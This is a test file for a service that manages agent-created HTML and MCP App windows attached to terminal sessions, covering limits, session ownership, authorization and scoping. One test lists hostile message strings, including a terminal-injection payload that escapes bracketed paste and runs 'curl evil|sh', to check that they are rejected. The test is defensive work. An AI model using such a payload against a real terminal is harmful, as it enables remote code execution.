import assert from "node:assert/strict";
import test from "node:test";
import {
  APP_WINDOW_EVENTS,
  APP_WINDOW_OPERATIONS,
  AppWindowError,
  AppWindowService,
  MAX_AGENT_WINDOW_HTML_BYTES,
  MAX_APP_WINDOW_TEXT_BYTES,
  MAX_MCP_APP_RESOURCE_BYTES,
} from "../dist/index.js";

function journal() {
  const events = [];
  return {
    events,
    revision: 0,
    cursor: "0",
    append(event, payload) { events.push({ event, payload }); return { revision: events.length, cursor: String(events.length), event, payload }; },
    publishTransient() {},
  };
}

function service(overrides = {}) {
  const events = journal();
  const delivered = [];
  const viewRequests = [];
  let holder = "client-desktop";
  const windows = new AppWindowService({
    eventJournal: events,
    isPresentationHolder: (_window, context) => context.clientId === holder,
    deliverMessage: async (window, text) => { delivered.push({ terminal: window.terminalSessionId, text }); },
    viewRequest: async (window, method, params) => { viewRequests.push({ window: window.id, method, params }); return { ok: true }; },
    ...overrides,
  });
  return { windows, events, delivered, viewRequests, setHolder: (next) => { holder = next; } };
}

const agentWindow = (overrides = {}) => ({
  terminalSessionId: "session-1",
  projectId: "project-1",
  title: "Hello",
  source: { kind: "agent" },
  html: "<h1>Hello</h1>",
  ...overrides,
});

const context = (clientId = "client-desktop", claims) => ({ clientId, connectionId: "c1", authScope: "write", signal: new AbortController().signal, ...(claims === undefined ? {} : { claims }) });
const command = (payload, clientId, body, claims) => ({ envelope: { payload }, body: body === undefined ? new Uint8Array() : new TextEncoder().encode(JSON.stringify(body)), context: context(clientId, claims) });
/** The document and tool data a content query carries as its body. */
const bodyOf = (response) => JSON.parse(new TextDecoder().decode(response.body));

async function rejectsWith(promise, code) {
  await assert.rejects(promise, (error) => { assert.equal(error.code, code); return true; });
}

test("a new window starts open, minimises the session's others, and is listed oldest first", () => {
  let now = 1000;
  const { windows, events } = service({ now: () => now++ });
  const first = windows.open(agentWindow());
  assert.equal(first.state, "open");
  assert.deepEqual(first.source, { kind: "agent" });
  const second = windows.open(agentWindow({ title: "Second" }));
  assert.deepEqual(windows.list("session-1").map((w) => [w.title, w.state]), [["Hello", "minimised"], ["Second", "open"]]);
  assert.notEqual(first.id, second.id);
  assert.equal(events.events.at(-1).event, APP_WINDOW_EVENTS.changed);
  // The journal reaches every subscriber, so it carries no title or document.
  assert.deepEqual(Object.keys(events.events.at(-1).payload.windows[0]).sort(), ["contentRevision", "id", "state", "terminalSessionId"]);
});

test("a ninth window is refused and the eight are unchanged", () => {
  const { windows } = service();
  for (let index = 0; index < 8; index += 1) windows.open(agentWindow({ title: `W${index}` }));
  const before = windows.list("session-1");
  assert.throws(() => windows.open(agentWindow({ title: "Ninth" })), (error) => error instanceof AppWindowError && error.code === "window_limit");
  assert.deepEqual(windows.list("session-1"), before);
  // The bound is per session: another terminal can still open one.
  assert.equal(windows.open(agentWindow({ terminalSessionId: "session-2" })).state, "open");
});

test("documents and titles are bounded by source", () => {
  const { windows } = service();
  assert.throws(() => windows.open(agentWindow({ html: "x".repeat(MAX_AGENT_WINDOW_HTML_BYTES + 1) })), (error) => error.code === "window_too_large");
  // Multi-byte text is counted in bytes, not characters.
  assert.throws(() => windows.open(agentWindow({ html: "é".repeat(MAX_AGENT_WINDOW_HTML_BYTES / 2 + 1) })), (error) => error.code === "window_too_large");
  assert.throws(() => windows.open(agentWindow({ title: "t".repeat(81) })), (error) => error.code === "window_invalid");
  assert.throws(() => windows.open(agentWindow({ title: "   " })), (error) => error.code === "window_invalid");
  assert.throws(() => windows.open(agentWindow({ html: "" })), (error) => error.code === "window_invalid");
  const app = { kind: "mcp-app", server: "diagrams", tool: "draw", resourceUri: "ui://diagrams/draw" };
  assert.equal(windows.open(agentWindow({ source: app, html: "x".repeat(MAX_AGENT_WINDOW_HTML_BYTES + 1) })).state, "open");
  assert.throws(() => windows.open(agentWindow({ source: app, html: "x".repeat(MAX_MCP_APP_RESOURCE_BYTES + 1) })), (error) => error.code === "window_too_large");
  assert.equal(windows.list().length, 1);
});

test("a window is addressable only through the session that owns it", () => {
  const { windows } = service();
  const mine = windows.open(agentWindow());
  assert.equal(windows.close("session-2", mine.id), false);
  assert.throws(() => windows.replace("session-2", mine.id, { title: "x", html: "<p>x</p>" }), (error) => error.code === "window_not_found");
  assert.equal(windows.list("session-2").length, 0);
  assert.equal(windows.list("session-1").length, 1);
  assert.equal(windows.close("session-1", mine.id), true);
  assert.equal(windows.list().length, 0);
});

test("replace updates an agent window in place and restores it; an MCP App window cannot be replaced", () => {
  const { windows } = service();
  const first = windows.open(agentWindow());
  const app = windows.open(agentWindow({ title: "Draw", source: { kind: "mcp-app", server: "diagrams", tool: "draw", resourceUri: "ui://d" } }));
  const replaced = windows.replace("session-1", first.id, { title: "Hello again", html: "<h1>2</h1>" });
  assert.equal(replaced.id, first.id);
  assert.equal(replaced.title, "Hello again");
  assert.equal(replaced.state, "open");
  assert.equal(replaced.contentRevision, first.contentRevision + 1);
  assert.equal(windows.list("session-1").find((w) => w.id === app.id).state, "minimised");
  assert.equal(windows.list("session-1").length, 2);
  assert.throws(() => windows.replace("session-1", app.id, { title: "x", html: "<p>x</p>" }), (error) => error.code === "window_invalid");
});

test("a session's windows end with it and leave other sessions alone", () => {
  const { windows } = service();
  windows.open(agentWindow());
  windows.open(agentWindow({ title: "Two" }));
  const other = windows.open(agentWindow({ terminalSessionId: "session-2" }));
  windows.endSession("session-1");
  assert.deepEqual(windows.list().map((w) => w.id), [other.id]);
  windows.endAll();
  assert.equal(windows.list().length, 0);
});

test("content is served with the document as the body and reflects the tool result", async () => {
  const { windows } = service();
  const app = windows.open(agentWindow({
    title: "Draw",
    source: { kind: "mcp-app", server: "diagrams", tool: "draw", resourceUri: "ui://d" },
    html: "<p>view</p>",
    csp: { connectDomains: ["https://api.example"] },
    tool: { name: "draw" },
    toolInput: { shape: "circle" },
  }));
  const { queries } = windows.operations();
  const before = await queries[APP_WINDOW_OPERATIONS.content](command({ windowId: app.id }));
  assert.equal(bodyOf(before).html, "<p>view</p>");
  assert.deepEqual(bodyOf(before).toolInput, { shape: "circle" });
  assert.deepEqual(before.result.csp, { connectDomains: ["https://api.example"] });
  assert.equal("toolResult" in bodyOf(before), false);
  // Tool data is never in the envelope, which is far smaller than a tool result may be.
  assert.equal("toolInput" in before.result, false);
  const large = { content: [{ type: "text", text: "r".repeat(300 * 1024) }] };
  windows.setToolResult(app.id, large);
  const after = await queries[APP_WINDOW_OPERATIONS.content](command({ windowId: app.id }));
  assert.deepEqual(bodyOf(after).toolResult, large);
  assert.ok(JSON.stringify(after.result).length < 4096);
  assert.equal(after.result.window.contentRevision, before.result.window.contentRevision + 1);
  windows.setToolCancelled(app.id, "upstream failed");
  const cancelled = await queries[APP_WINDOW_OPERATIONS.content](command({ windowId: app.id }));
  assert.equal(bodyOf(cancelled).toolCancelled, "upstream failed");
  await rejectsWith(queries[APP_WINDOW_OPERATIONS.content](command({ windowId: "win_missing" })), "not_found");
  await rejectsWith(queries[APP_WINDOW_OPERATIONS.content](command({ windowId: 7 })), "validation");
});

test("opening a window through the protocol minimises the others; closing removes it", async () => {
  const { windows } = service();
  const first = windows.open(agentWindow());
  const second = windows.open(agentWindow({ title: "Two" }));
  const { commands } = windows.operations();
  await commands[APP_WINDOW_OPERATIONS.setState](command({ windowId: first.id, state: "open" }));
  assert.deepEqual(windows.list("session-1").map((w) => w.state), ["open", "minimised"]);
  await commands[APP_WINDOW_OPERATIONS.setState](command({ windowId: first.id, state: "minimised" }));
  assert.deepEqual(windows.list("session-1").map((w) => w.state), ["minimised", "minimised"]);
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.setState](command({ windowId: first.id, state: "floating" })), "validation");
  await commands[APP_WINDOW_OPERATIONS.close](command({ windowId: second.id }));
  assert.deepEqual(windows.list("session-1").map((w) => w.id), [first.id]);
});

test("a view's message is delivered to the owning terminal only from the presentation holder, then the window minimises", async () => {
  const { windows, delivered } = service();
  const window = windows.open(agentWindow());
  const { commands } = windows.operations();
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id, text: "hi" }, "client-phone")), "forbidden");
  assert.deepEqual(delivered, []);
  assert.equal(windows.list("session-1")[0].state, "open");
  await commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id, text: "Deploy api to eu-west-1" }));
  assert.deepEqual(delivered, [{ terminal: "session-1", text: "Deploy api to eu-west-1" }]);
  assert.equal(windows.list("session-1")[0].state, "minimised");
});

test("empty and oversized messages are rejected and nothing is delivered", async () => {
  const { windows, delivered } = service();
  const window = windows.open(agentWindow());
  const { commands } = windows.operations();
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id, text: "" })), "validation");
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id, text: "x".repeat(MAX_APP_WINDOW_TEXT_BYTES + 1) })), "validation");
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id })), "validation");
  assert.deepEqual(delivered, []);
});

test("a refused message leaves the window open", async () => {
  const { windows } = service({ deliverMessage: async () => { throw Object.assign(new Error("Window Messages is set to Never Allow"), { code: "forbidden" }); } });
  const window = windows.open(agentWindow());
  const { commands } = windows.operations();
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id, text: "hi" })), "forbidden");
  assert.equal(windows.list("session-1")[0].state, "open");
});

test("model context is delivered once, the latest update wins, and it stays with its terminal", async () => {
  const { windows } = service();
  const window = windows.open(agentWindow({ title: "Picker" }));
  windows.open(agentWindow({ terminalSessionId: "session-2", title: "Other" }));
  const { commands } = windows.operations();
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.context](command({ windowId: window.id, text: "first" }, "client-phone")), "forbidden");
  await commands[APP_WINDOW_OPERATIONS.context](command({ windowId: window.id, text: "first" }));
  await commands[APP_WINDOW_OPERATIONS.context](command({ windowId: window.id, text: "second" }));
  assert.deepEqual(windows.takeModelContext("session-2"), []);
  assert.deepEqual(windows.takeModelContext("session-1"), [{ title: "Picker", text: "second" }]);
  assert.deepEqual(windows.takeModelContext("session-1"), []);
});

test("only an MCP App view held by the presentation holder can reach its server", async () => {
  const { windows, viewRequests, setHolder } = service();
  const agent = windows.open(agentWindow());
  const app = windows.open(agentWindow({ title: "Draw", source: { kind: "mcp-app", server: "diagrams", tool: "draw", resourceUri: "ui://d" } }));
  const { commands } = windows.operations();
  // The method is in the envelope; the parameters are the body.
  const params = { name: "poll", arguments: {} };
  const call = (windowId, clientId, method = "tools/call", body = params) =>
    commands[APP_WINDOW_OPERATIONS.viewRequest](command({ windowId, method }, clientId, body));
  await rejectsWith(call(agent.id), "forbidden");
  await rejectsWith(call(app.id, "client-phone"), "forbidden");
  await rejectsWith(call(app.id, undefined, "prompts/get"), "validation");
  await rejectsWith(call(app.id, undefined, "tools/call", ["not", "an", "object"]), "validation");
  await rejectsWith(call(app.id, undefined, "tools/call", { blob: "p".repeat(300 * 1024) }), "validation");
  assert.deepEqual(viewRequests, []);
  assert.deepEqual(await call(app.id), { response: { ok: true } });
  assert.deepEqual(viewRequests, [{ window: app.id, method: "tools/call", params }]);
  // Parameters larger than an envelope arrive whole.
  const big = { name: "poll", arguments: { blob: "p".repeat(100 * 1024) } };
  await call(app.id, undefined, "tools/call", big);
  assert.deepEqual(viewRequests.at(-1).params, big);
  // After a takeover the new holder speaks for the view and the old one cannot.
  setHolder("client-phone");
  await rejectsWith(call(app.id), "forbidden");
  await call(app.id, "client-phone");
  assert.equal(viewRequests.length, 3);
});

test("a refusal for not controlling the terminal says so; that is the only refusal a client retries", async () => {
  const { windows } = service();
  const window = windows.open(agentWindow());
  const { commands } = windows.operations();
  await assert.rejects(
    commands[APP_WINDOW_OPERATIONS.context](command({ windowId: window.id, text: "hi" }, "client-phone")),
    (error) => { assert.equal(error.code, "forbidden"); assert.deepEqual(error.details, { reason: "not-controller" }); return true; },
  );
});

test("a response too large for a command result is held once, for the client that asked", async () => {
  const large = { content: [{ type: "text", text: "v".repeat(100 * 1024) }] };
  const { windows } = service({ viewRequest: async () => large });
  const app = windows.open(agentWindow({ title: "Draw", source: { kind: "mcp-app", server: "diagrams", tool: "draw", resourceUri: "ui://d" } }));
  const { commands, queries } = windows.operations();
  const call = () => commands[APP_WINDOW_OPERATIONS.viewRequest](command({ windowId: app.id, method: "tools/call" }, undefined, { name: "poll" }));
  const fetch = (responseId, clientId) => queries[APP_WINDOW_OPERATIONS.viewResponse](command({ windowId: app.id, responseId }, clientId));
  const { responseId, response } = await call();
  assert.equal(response, undefined);
  assert.equal(typeof responseId, "string");
  await rejectsWith(fetch(responseId, "client-phone"), "not_found");
  assert.deepEqual(bodyOf(await fetch(responseId)), large);
  await rejectsWith(fetch(responseId), "not_found");
  await rejectsWith(fetch("res_nope"), "not_found");
  // Only a few are held; the oldest unfetched goes first.
  const ids = [];
  for (let index = 0; index < 6; index += 1) ids.push((await call()).responseId);
  await rejectsWith(fetch(ids[0]), "not_found");
  assert.deepEqual(bodyOf(await fetch(ids[5])), large);
});

test("a response over the limit is refused, not truncated", async () => {
  const { windows } = service({ viewRequest: async () => ({ blob: "v".repeat(4 * 1024 * 1024 + 1) }) });
  const app = windows.open(agentWindow({ title: "Draw", source: { kind: "mcp-app", server: "diagrams", tool: "draw", resourceUri: "ui://d" } }));
  const { commands } = windows.operations();
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.viewRequest](command({ windowId: app.id, method: "tools/call" }, undefined, {})), "validation");
});

test("a client bound to another project or terminal neither sees nor touches a window", async () => {
  const { windows } = service();
  const mine = windows.open(agentWindow());
  const other = windows.open(agentWindow({ terminalSessionId: "session-2", projectId: "project-2", title: "Other" }));
  const { queries, commands } = windows.operations();
  const bound = { projectId: "project-2" };
  const listed = await queries[APP_WINDOW_OPERATIONS.list](command({}, "client-desktop", undefined, bound));
  assert.deepEqual(listed.windows.map((window) => window.id), [other.id]);
  await rejectsWith(queries[APP_WINDOW_OPERATIONS.content](command({ windowId: mine.id }, "client-desktop", undefined, bound)), "not_found");
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.close](command({ windowId: mine.id }, "client-desktop", undefined, bound)), "not_found");
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.setState](command({ windowId: mine.id, state: "minimised" }, "client-desktop", undefined, bound)), "not_found");
  await rejectsWith(commands[APP_WINDOW_OPERATIONS.message](command({ windowId: mine.id, text: "hi" }, "client-desktop", undefined, bound)), "not_found");
  assert.equal(windows.list().length, 2);
  // A client bound to one terminal session is held to it within its project too.
  const session = { projectId: "project-1", sessionId: "session-9" };
  assert.deepEqual((await queries[APP_WINDOW_OPERATIONS.list](command({}, "client-desktop", undefined, session))).windows, []);
  await rejectsWith(queries[APP_WINDOW_OPERATIONS.content](command({ windowId: mine.id }, "client-desktop", undefined, session)), "not_found");
  // An unbound client, and one bound to the right place, are unaffected.
  assert.equal((await queries[APP_WINDOW_OPERATIONS.list](command({}))).windows.length, 2);
  await queries[APP_WINDOW_OPERATIONS.content](command({ windowId: mine.id }, "client-desktop", undefined, { projectId: "project-1", sessionId: "session-1" }));
});

test("a window message is text: anything that would be a keystroke is refused", async () => {
  const { windows, delivered } = service();
  const window = windows.open(agentWindow());
  const { commands } = windows.operations();
  const send = (text) => commands[APP_WINDOW_OPERATIONS.message](command({ windowId: window.id, text }));
  for (const hostile of [
    "hi\u001b[201~\u0003\u0003curl evil|sh\r",
    "interrupt\u0003",
    "carriage\rreturn",
    "escape\u001b[2J",
    "bell\u0007",
    "nul\u0000",
    "delete\u007f",
    "c1\u009b31m",
    "backspace\b",
  ])
    await rejectsWith(send(hostile), "validation");
  assert.deepEqual(delivered, []);
  await send("deploy to eu-west-1\n\twith two lines, unicode é and 😀");
  assert.deepEqual(delivered.map((entry) => entry.text), ["deploy to eu-west-1\n\twith two lines, unicode é and 😀"]);
});

test("listing needs only read authority; everything else needs write", () => {
  const { policies } = service().windows.operations();
  assert.deepEqual(policies[APP_WINDOW_OPERATIONS.list], { scope: "read" });
  for (const operation of Object.values(APP_WINDOW_OPERATIONS))
    if (operation !== APP_WINDOW_OPERATIONS.list) assert.deepEqual(policies[operation], { scope: "write" }, operation);
});
